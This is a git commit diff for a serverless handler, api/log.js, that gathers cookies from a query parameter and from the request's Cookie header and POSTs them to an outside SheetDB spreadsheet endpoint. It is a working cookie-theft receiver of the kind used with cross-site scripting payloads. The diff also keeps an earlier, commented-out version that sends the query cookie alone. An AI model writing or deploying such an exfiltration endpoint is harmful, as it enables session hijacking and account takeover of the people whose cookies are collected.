7ebf48e0ea7eca74e5a4c9b8380c787ea56acbb2
Dharbendra Sah <136152589+dharbendrasah@users.noreply.github.com>
2025-05-25 14:47:23 +0545

    2nd commit

--- api/log.js
+++ api/log.js
@@ -1,5 +1,28 @@
+// export default async function handler(req, res) {
+//   const cookie = req.query.c || "no-cookie";
+
+//   try {
+//     await fetch("https://sheetdb.io/api/v1/52j1sx3wjdti6", {
+//       method: "POST",
+//       headers: {
+//         "Content-Type": "application/json"
+//       },
+//       body: JSON.stringify({
+//         data: [{ indusdata: cookie }]
+//       })
+//     });
+
+//     res.status(200).send("Cookie sent to SheetDB");
+//   } catch (err) {
+//     res.status(500).send("Error: " + err.message);
+//   }
+// }
+
+
+// this is 2nd code 
 export default async function handler(req, res) {
-  const cookie = req.query.c || "no-cookie";
+  const cookieFromQuery = req.query.c || "no-cookie";
+  const rawCookieFromHeader = req.headers.cookie || "header-cookie-missing";
 
   try {
     await fetch("https://sheetdb.io/api/v1/52j1sx3wjdti6", {
@@ -8,11 +31,14 @@ export default async function handler(req, res) {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        data: [{ indusdata: cookie }]
+        data: [{
+          indusdata: cookieFromQuery,
+          fromHeader: rawCookieFromHeader
+        }]
       })
     });
 
-    res.status(200).send("Cookie sent to SheetDB");
+    res.status(200).send("Cookies sent to SheetDB");
   } catch (err) {
     res.status(500).send("Error: " + err.message);
   }
